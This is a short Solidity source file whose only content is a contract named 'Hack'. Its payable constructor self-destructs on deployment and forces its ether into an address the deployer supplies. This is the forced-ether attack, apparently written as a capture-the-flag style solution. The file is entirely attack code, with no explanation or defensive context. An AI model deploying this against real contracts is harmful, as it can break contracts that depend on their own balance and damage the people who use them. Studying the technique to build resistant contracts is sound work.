//SPDX-License-Identifier: MIT
pragma solidity^0.8;

contract Hack{
    constructor(address payable _contractAddress) payable {
        selfdestruct(_contractAddress);
    }
}